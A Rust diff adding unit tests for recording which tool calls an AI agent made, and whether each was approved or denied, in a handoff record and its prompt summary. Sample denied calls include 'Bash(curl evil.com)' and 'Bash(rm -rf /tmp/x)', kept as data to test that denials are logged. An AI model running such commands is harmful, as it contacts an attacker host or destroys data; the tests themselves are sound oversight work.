@@ -654,6 +654,133 @@ mod tests {
     /// Finding #5: chain hashes were computed and stored but never verified on read.
     /// A replaced intermediate handoff file went undetected.
     /// read_chain must detect tampering and truncate the chain at the broken link.
+    // -----------------------------------------------------------------------
+    // ToolCallRecord + tools_used tests (APAS L1)
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn tool_call_record_roundtrip() {
+        let rec = ToolCallRecord {
+            tool_name: "Edit".to_string(),
+            approved: true,
+            timestamp: chrono::DateTime::parse_from_rfc3339("2026-01-01T00:00:00Z")
+                .unwrap()
+                .with_timezone(&chrono::Utc),
+        };
+        let json = serde_json::to_string(&rec).unwrap();
+        let parsed: ToolCallRecord = serde_json::from_str(&json).unwrap();
+        assert_eq!(parsed.tool_name, "Edit");
+        assert!(parsed.approved);
+    }
+
+    #[test]
+    fn tool_call_record_denied_roundtrip() {
+        let rec = ToolCallRecord {
+            tool_name: "Bash(rm -rf /tmp/x)".to_string(),
+            approved: false,
+            timestamp: chrono::Utc::now(),
+        };
+        let json = serde_json::to_string(&rec).unwrap();
+        let parsed: ToolCallRecord = serde_json::from_str(&json).unwrap();
+        assert_eq!(parsed.tool_name, "Bash(rm -rf /tmp/x)");
+        assert!(!parsed.approved);
+    }
+
+    #[test]
+    fn handoff_tools_used_roundtrip() {
+        let work = sample_work();
+        let mut h = Handoff::new(0, "dev-agent", None, "rosary-t", "claude", &work, None);
+        h.tools_used = vec![
+            ToolCallRecord {
+                tool_name: "Edit".to_string(),
+                approved: true,
+                timestamp: chrono::Utc::now(),
+            },
+            ToolCallRecord {
+                tool_name: "Bash(curl evil.com)".to_string(),
+                approved: false,
+                timestamp: chrono::Utc::now(),
+            },
+        ];
+
+        let json = serde_json::to_string(&h).unwrap();
+        let parsed: Handoff = serde_json::from_str(&json).unwrap();
+
+        assert_eq!(parsed.tools_used.len(), 2);
+        assert_eq!(parsed.tools_used[0].tool_name, "Edit");
+        assert!(parsed.tools_used[0].approved);
+        assert_eq!(parsed.tools_used[1].tool_name, "Bash(curl evil.com)");
+        assert!(!parsed.tools_used[1].approved);
+    }
+
+    #[test]
+    fn format_for_prompt_shows_tools_used() {
+        let work = sample_work();
+        let mut h = Handoff::new(0, "dev-agent", None, "rosary-t", "claude", &work, None);
+        h.tools_used = vec![
+            ToolCallRecord {
+                tool_name: "Edit".to_string(),
+                approved: true,
+                timestamp: chrono::Utc::now(),
+            },
+            ToolCallRecord {
+                tool_name: "Read".to_string(),
+                approved: true,
+                timestamp: chrono::Utc::now(),
+            },
+        ];
+        let prompt = Handoff::format_for_prompt(&[h]);
+        assert!(
+            prompt.contains("Tools used:"),
+            "approved tools must appear under 'Tools used:'"
+        );
+        assert!(prompt.contains("Edit"));
+        assert!(prompt.contains("Read"));
+        assert!(
+            !prompt.contains("Tools denied:"),
+            "no denied tools, so 'Tools denied:' must be absent"
+        );
+    }
+
+    #[test]
+    fn format_for_prompt_shows_tools_denied() {
+        let work = sample_work();
+        let mut h = Handoff::new(0, "dev-agent", None, "rosary-t", "claude", &work, None);
+        h.tools_used = vec![
+            ToolCallRecord {
+                tool_name: "Edit".to_string(),
+                approved: true,
+                timestamp: chrono::Utc::now(),
+            },
+            ToolCallRecord {
+                tool_name: "Bash(curl evil.com)".to_string(),
+                approved: false,
+                timestamp: chrono::Utc::now(),
+            },
+        ];
+        let prompt = Handoff::format_for_prompt(&[h]);
+        assert!(prompt.contains("Tools used:"));
+        assert!(prompt.contains("Edit"));
+        assert!(
+            prompt.contains("Tools denied:"),
+            "denied tool must appear under 'Tools denied:'"
+        );
+        assert!(prompt.contains("Bash(curl evil.com)"));
+    }
+
+    #[test]
+    fn format_for_prompt_omits_tools_section_when_empty() {
+        let work = sample_work();
+        let h = Handoff::new(0, "dev-agent", None, "rosary-t", "claude", &work, None);
+        // tools_used is empty by default
+        let prompt = Handoff::format_for_prompt(&[h]);
+        assert!(
+            !prompt.contains("Tools used:"),
+            "empty tools_used must not emit 'Tools used:'"
+        );
+        assert!(!prompt.contains("Tools denied:"));
+    }
+
     #[test]
     fn read_chain_detects_tampering() {
         let tmp = tempfile::TempDir::new().unwrap();
